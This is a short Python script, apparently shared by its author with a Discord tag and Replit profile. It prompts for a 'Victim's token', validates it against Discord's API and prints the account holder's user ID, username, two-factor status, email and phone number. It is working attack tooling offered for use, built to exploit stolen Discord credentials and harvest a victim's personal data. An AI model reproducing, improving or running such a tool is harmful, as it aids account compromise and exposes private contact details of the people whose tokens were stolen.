#By Phant0m The Great
from os import system
import requests
 #colors--
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
#colors--

while True:
 system("clear")
 print(f"""{bcyan}
 __        __                        
 \ \      / /__ _ __ _ __   ___ _ __ 
  \ \ /\ / / _ \ '__| '_ \ / _ \ '__|
   \ V  V /  __/ |  | | | |  __/ |   
    \_/\_/ \___|_|  |_| |_|\___|_|   
                                     
""")                                                    
                                   
 print(f"""{white}Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
Replit Profile: https://replit.com/@phant0m007      
""")
 token = input("[>>>] Victim's token: ")

 head = {'Authorization': str(token)}
 src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
 if src.status_code != 200:
   print(f"""{red}[Invalid Token]""")
   print(f"""{white}Do you want to try again? if yes, start over""")
   exit(0)
 
 system('clear')
 print(f"""{bcyan}
 __        __                        
 \ \      / /__ _ __ _ __   ___ _ __ 
  \ \ /\ / / _ \ '__| '_ \ / _ \ '__|
   \ V  V /  __/ |  | | | |  __/ |   
    \_/\_/ \___|_|  |_| |_|\___|_|   
                                     
""")                                                    
                                   
 print(f"""{white}Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
Replit Profile: https://replit.com/@phant0m007      
""")
              
              
 print(f"""{white}_________________[TOKEN INFO]_________________""")
 headers = {'Authorization': token, 'Content-Type': 'application/json'}
 r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
 if r.status_code == 200:
         userName = r.json()['username'] + '#' + r.json()['discriminator']
         userID = r.json()['id']
         phone = r.json()['phone']
         email = r.json()['email']
         mfa = r.json()['mfa_enabled']
         print(f'''
[{cyan}User ID{white}]         {userID}
[{cyan}User Name{white}]     {userName}
[{cyan}2 Factor{white}]        {mfa}
[{cyan}Email{white}]           {email}
[{cyan}Phone number{white}]    {phone if phone else ""}
[{cyan}Token{white}]           {token}

----------------------------------------------
            ''')
 cont=input('Do you want to consult the data of another account? If yes, press enter')
